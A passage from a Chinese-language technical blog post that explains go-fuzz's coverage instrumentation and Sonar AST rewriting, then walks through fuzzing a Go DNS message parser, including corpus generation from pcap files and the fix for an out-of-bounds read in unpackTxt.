class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>f <span class="token operator">*</span>File<span class="token punctuation">)</span> <span class="token function">endsBasicSourceBlock</span><span class="token punctuation">(</span>s ast<span class="token punctuation">.</span>Stmt<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span><span class="token keyword">switch</span> s <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>BlockStmt<span class="token punctuation">:</span><span class="token comment">// Treat blocks like basic blocks to avoid overlapping counters.</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>BranchStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>ForStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>IfStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>LabeledStmt<span class="token punctuation">:</span><span class="token keyword">return</span> f<span class="token punctuation">.</span><span class="token function">endsBasicSourceBlock</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>Stmt<span class="token punctuation">)</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>RangeStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>SwitchStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>SelectStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>TypeSwitchStmt<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>ExprStmt<span class="token punctuation">:</span><span class="token comment">// Calls to panic change the flow.</span><span class="token comment">// We really should verify that "panic" is the predefined function,</span><span class="token comment">// but without type checking we can't and the likelihood of it being</span><span class="token comment">// an actual problem is vanishingly small.</span><span class="token keyword">if</span> call<span class="token punctuation">,</span> ok <span class="token operator">:=</span> s<span class="token punctuation">.</span>X<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>ast<span class="token punctuation">.</span>CallExpr<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">{</span><span class="token keyword">if</span> ident<span class="token punctuation">,</span> ok <span class="token operator">:=</span> call<span class="token punctuation">.</span>Fun<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>ast<span class="token punctuation">.</span>Ident<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token operator">&amp;&amp;</span> ident<span class="token punctuation">.</span>Name <span class="token operator">==</span> <span class="token string">"panic"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">len</span><span class="token punctuation">(</span>call<span class="token punctuation">.</span>Args<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>found<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">hasFuncLiteral</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">return</span> found<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是大量的switch语句，如果是的话，就可以将直接边界作为end进行插桩，这一步的意义其实就是在于把{}里面的body不断的分割成一个个可以影响控制流的小块进行分别插桩。其实到这里我们就可以洞悉go-fuzz整个的插桩思想：在语法分析的时候就通过go-fuzz本身所包含的一个包的内容插桩到各个可以影响控制流的语句块中，那么接下来对应的工作就应该是如何对这些进行插桩语句块进行感知，这其实就是Sonar结构体的作用，这是go-fuzz发明的声呐系统。</p><h4 id="Sonar遍历"><a href="#Sonar遍历" class="headerlink" title="Sonar遍历"></a>Sonar遍历</h4><p>​        Sonar结构体同样实现了Visit方法来用于遍历语法树，部分源码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Sonar<span class="token punctuation">)</span> <span class="token function">Visit</span><span class="token punctuation">(</span>n ast<span class="token punctuation">.</span>Node<span class="token punctuation">)</span> ast<span class="token punctuation">.</span>Visitor <span class="token punctuation">{</span><span class="token keyword">switch</span> nn <span class="token operator">:=</span> n<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>BinaryExpr<span class="token punctuation">:</span><span class="token keyword">break</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">case</span> <span class="token operator">*</span>ast<span class="token punctuation">.</span>SwitchStmt<span class="token punctuation">:</span><span class="token keyword">if</span> nn<span class="token punctuation">.</span>Tag <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">||</span> nn<span class="token punctuation">.</span>Body <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> s <span class="token comment">// recurse</span><span class="token punctuation">}</span><span class="token comment">// Replace:</span><span class="token comment">//switch a := foo(); bar(a) {</span><span class="token comment">//case x: ...</span><span class="token comment">//case y: ...</span><span class="token comment">//}</span><span class="token comment">// with:</span><span class="token comment">//switch {</span><span class="token comment">//default:</span><span class="token comment">//a := foo()</span><span class="token comment">//__tmp := bar(a)</span><span class="token comment">//switch {</span><span class="token comment">//case __tmp == x: ...</span><span class="token comment">//case __tmp == y: ...</span><span class="token comment">//}</span><span class="token comment">//}</span><span class="token comment">// The == comparisons will be instrumented later when we recurse.</span>sw <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>SwitchStmt<span class="token punctuation">)</span><span class="token operator">*</span>sw <span class="token operator">=</span> <span class="token operator">*</span>nn<span class="token keyword">var</span> stmts <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Stmt<span class="token keyword">if</span> sw<span class="token punctuation">.</span>Init <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>stmts <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>stmts<span class="token punctuation">,</span> sw<span class="token punctuation">.</span>Init<span class="token punctuation">)</span>sw<span class="token punctuation">.</span>Init <span class="token operator">=</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">const</span> tmpvar <span class="token operator">=</span> <span class="token string">"__go_fuzz_tmp"</span>tmp <span class="token operator">:=</span> ast<span class="token punctuation">.</span><span class="token function">NewIdent</span><span class="token punctuation">(</span>tmpvar<span class="token punctuation">)</span>typ <span class="token operator">:=</span> s<span class="token punctuation">.</span>info<span class="token punctuation">.</span>Types<span class="token punctuation">[</span>sw<span class="token punctuation">.</span>Tag<span class="token punctuation">]</span>s<span class="token punctuation">.</span>info<span class="token punctuation">.</span>Types<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> typstmts <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>stmts<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>AssignStmt<span class="token punctuation">{</span>Lhs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Expr<span class="token punctuation">{</span>tmp<span class="token punctuation">}</span><span class="token punctuation">,</span> Tok<span class="token punctuation">:</span> token<span class="token punctuation">.</span>DEFINE<span class="token punctuation">,</span> Rhs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Expr<span class="token punctuation">{</span>sw<span class="token punctuation">.</span>Tag<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>stmts <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>stmts<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>AssignStmt<span class="token punctuation">{</span>Lhs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Expr<span class="token punctuation">{</span>ast<span class="token punctuation">.</span><span class="token function">NewIdent</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> Tok<span class="token punctuation">:</span> token<span class="token punctuation">.</span>ASSIGN<span class="token punctuation">,</span> Rhs<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Expr<span class="token punctuation">{</span>tmp<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>sw<span class="token punctuation">.</span>Tag <span class="token operator">=</span> <span class="token boolean">nil</span>stmts <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>stmts<span class="token punctuation">,</span> sw<span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> cas1 <span class="token operator">:=</span> <span class="token keyword">range</span> sw<span class="token punctuation">.</span>Body<span class="token punctuation">.</span>List <span class="token punctuation">{</span>cas <span class="token operator">:=</span> cas1<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>ast<span class="token punctuation">.</span>CaseClause<span class="token punctuation">)</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> expr <span class="token operator">:=</span> <span class="token keyword">range</span> cas<span class="token punctuation">.</span>List <span class="token punctuation">{</span>tmp <span class="token operator">:=</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>Ident<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> tmpvar<span class="token punctuation">,</span> NamePos<span class="token punctuation">:</span> expr<span class="token punctuation">.</span><span class="token function">Pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>s<span class="token punctuation">.</span>info<span class="token punctuation">.</span>Types<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> typcas<span class="token punctuation">.</span>List<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>BinaryExpr<span class="token punctuation">{</span>X<span class="token punctuation">:</span> tmp<span class="token punctuation">,</span> Op<span class="token punctuation">:</span> token<span class="token punctuation">.</span>EQL<span class="token punctuation">,</span> Y<span class="token punctuation">:</span> expr<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>nn<span class="token punctuation">.</span>Tag <span class="token operator">=</span> <span class="token boolean">nil</span>nn<span class="token punctuation">.</span>Init <span class="token operator">=</span> <span class="token boolean">nil</span>nn<span class="token punctuation">.</span>Body <span class="token operator">=</span> <span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>BlockStmt<span class="token punctuation">{</span>List<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ast<span class="token punctuation">.</span>Stmt<span class="token punctuation">{</span><span class="token operator">&amp;</span>ast<span class="token punctuation">.</span>CaseClause<span class="token punctuation">{</span>Body<span class="token punctuation">:</span> stmts<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> s <span class="token comment">// recurse</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一步先根据节点类型找到Switch和For这种结构进行语法树级别的变化，整体的替换逻辑已经在注释里面体现出来了，其实就是类似把switch的条件都提出来放在body内部，然后再body里面建立一个新的switch结构，主要作用可能就是方便识别和统计，对于ast.BinaryExpr结构则是通过自定义的flag进行标注。</p><p>​        整体来看其实就是对包内代码各种语法树节点进行类型检查和过滤，因为一些代码是肯定顺序执行的，然后再需要的地方都插入一些标志，同时在结构体里面记录标志的总量，方便在fuzz执行的时候确定自己的代码位置从而更方便进行统计，具体的可以细看相关代码。</p><h4 id="插桩总结"><a href="#插桩总结" class="headerlink" title="插桩总结"></a>插桩总结</h4><p>​        其实无论是File还是Sonar，个人认为都算是一种插桩，方便对代码覆盖率进行统计，在结束之后都通过createFuzzMain函数进行了封装，这个地方其实也是go-fuzz不支持fuzz的代码包含main函数的具体原因：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Context<span class="token punctuation">)</span> <span class="token function">createFuzzMain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>mainPkg <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>fuzzpkg<span class="token punctuation">.</span>PkgPath<span class="token punctuation">,</span> <span class="token string">"go.fuzz.main"</span><span class="token punctuation">)</span>path <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>workdir<span class="token punctuation">,</span> <span class="token string">"gopath"</span><span class="token punctuation">,</span> <span class="token string">"src"</span><span class="token punctuation">,</span> mainPkg<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">mkdirAll</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">"main.go"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">funcMain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> mainPkg<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是将已经写好的main函数模板写入：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> ainSrc <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">Must</span><span class="token punctuation">(</span>template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">`package mainimport (target "{{.Pkg}}"dep "go-fuzz-dep")func main() {fns := []func([]byte)int {{{range .AllFuncs}}target.{{.}},{{end}}}dep.Main(fns)}`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要作用还是调用包内的Fuzz代码。</p><h3 id="go-fuzz-1"><a href="#go-fuzz-1" class="headerlink" title="go-fuzz"></a>go-fuzz</h3><ol><li>首先通过丢弃触发相同代码路径的的样本来最小化语料库。</li><li>开始改变输入并将数据传递给Fuzz函数，不失败（return 1），然后扩展代码覆盖率的突变会被保留和迭代形成新的样本。</li><li>当程序出现Crash的时候，会保存报告并重新启动程序。</li></ol><p>Fuzz这块的具体原理其实都是参考的AFL，就不多说了，详细也可以参考AFL的Fuzz方式和源码。</p><h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>​        首先简单介绍一下go的Fuzz函数的基本信息：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Fuzz</span><span class="token punctuation">(</span>data <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>该函数以int作为返回值，因此当其返回值为0的时候说明Fuzz对于数据不敢影响，可能的原因是测试目标发生了无意义的错误，比如输入内容不合法等，返回值为1说明该数据已经被成功解析，简单来说就是Fuzz输入的data被目标所接受。</p><h3 id="DNS解析器Fuzz"><a href="#DNS解析器Fuzz" class="headerlink" title="DNS解析器Fuzz"></a>DNS解析器Fuzz</h3><p>首先第一步是创建初始语料库，其实就是通过拆解pcap数据包来创造数据：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"crypto/rand"</span><span class="token string">"encoding/hex"</span><span class="token string">"log"</span><span class="token string">"os"</span><span class="token string">"strconv"</span><span class="token string">"github.com/miekg/pcap"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">fatalIfErr</span><span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>handle<span class="token punctuation">,</span> err <span class="token operator">:=</span> pcap<span class="token punctuation">.</span><span class="token function">OpenOffline</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">fatalIfErr</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>b <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token function">fatalIfErr</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>prefix <span class="token operator">:=</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>i <span class="token operator">:=</span> <span class="token number">0</span><span class="token keyword">for</span> pkt <span class="token operator">:=</span> handle<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> pkt <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">;</span> pkt <span class="token operator">=</span> handle<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pkt<span class="token punctuation">.</span><span class="token function">Decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"p_"</span> <span class="token operator">+</span> prefix <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">+</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">fatalIfErr</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>pkt<span class="token punctuation">.</span>Payload<span class="token punctuation">)</span><span class="token function">fatalIfErr</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token function">fatalIfErr</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>i<span class="token operator">++</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写初步的Fuzz函数：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Fuzz</span><span class="token punctuation">(</span>rawMsg <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>    msg <span class="token operator">:=</span> <span class="token operator">&amp;</span>dns<span class="token punctuation">.</span>Msg<span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErr <span class="token operator">:=</span> msg<span class="token punctuation">.</span><span class="token function">Unpack</span><span class="token punctuation">(</span>rawMsg<span class="token punctuation">)</span><span class="token punctuation">;</span> unpackErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token boolean">_</span><span class="token punctuation">,</span> packErr <span class="token operator">=</span> msg<span class="token punctuation">.</span><span class="token function">Pack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> packErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"failed to pack back a message"</span><span class="token punctuation">)</span>        spew<span class="token punctuation">.</span><span class="token function">Dump</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token function">panic</span><span class="token punctuation">(</span>packErr<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作者在发现了越界：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">unpackTxt</span><span class="token punctuation">(</span>msg <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> offset<span class="token punctuation">,</span> rdend <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> err <span class="token builtin">error</span><span class="token keyword">var</span> ss <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token keyword">var</span> s <span class="token builtin">string</span><span class="token keyword">for</span> offset <span class="token operator">&lt;</span> rdend <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>s<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> err <span class="token operator">=</span> <span class="token function">unpackTxtString</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>ss <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> ss<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> err<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是因为这些越界使得程序经常崩溃，并且Fuzz变的缓慢，于是作者先进行了阶段性的修复工作，主要修复是使用len(msg)而不是使用保留的偏移量：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">unpackTxt</span><span class="token punctuation">(</span>msg <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> off0 <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>ss <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> off <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>off <span class="token operator">=</span> off0<span class="token keyword">var</span> s <span class="token builtin">string</span><span class="token keyword">for</span> off <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>s<span class="token punctuation">,</span> off<span class="token punctuation">,</span> err <span class="token operator">=</span> <span class="token function">unpackTxtString</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> off<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>ss <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后修改好的Fuzz，主要的修改在于增加了ParseDNSPacketSafely，并抛弃了一些无意义的错误，也可能不断测试，不断排除已知的错误:</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Fuzz</span><span class="token punctuation">(</span>rawMsg <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token punctuation">(</span>        msg<span class="token punctuation">,</span> msgOld <span class="token operator">=</span> <span class="token operator">&amp;</span>dns<span class="token punctuation">.</span>Msg<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>old<span class="token punctuation">.</span>Msg<span class="token punctuation">{</span><span class="token punctuation">}</span>        buf<span class="token punctuation">,</span> bufOld <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span>        res<span class="token punctuation">,</span> resOld <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>        unpackErr<span class="token punctuation">,</span> unpackErrOld <span class="token builtin">error</span>        packErr<span class="token punctuation">,</span> packErrOld     <span class="token builtin">error</span>    <span class="token punctuation">)</span>    unpackErr <span class="token operator">=</span> msg<span class="token punctuation">.</span><span class="token function">Unpack</span><span class="token punctuation">(</span>rawMsg<span class="token punctuation">)</span>    unpackErrOld <span class="token operator">=</span> <span class="token function">ParseDNSPacketSafely</span><span class="token punctuation">(</span>rawMsg<span class="token punctuation">,</span> msgOld<span class="token punctuation">)</span>    <span class="token keyword">if</span> unpackErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> unpackErrOld <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> unpackErr<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"dns: out of order NSEC block"</span> <span class="token punctuation">{</span>        <span class="token comment">// 97b0a31 - rewrite NSEC bitmap [un]packing to account for out-of-order</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErr 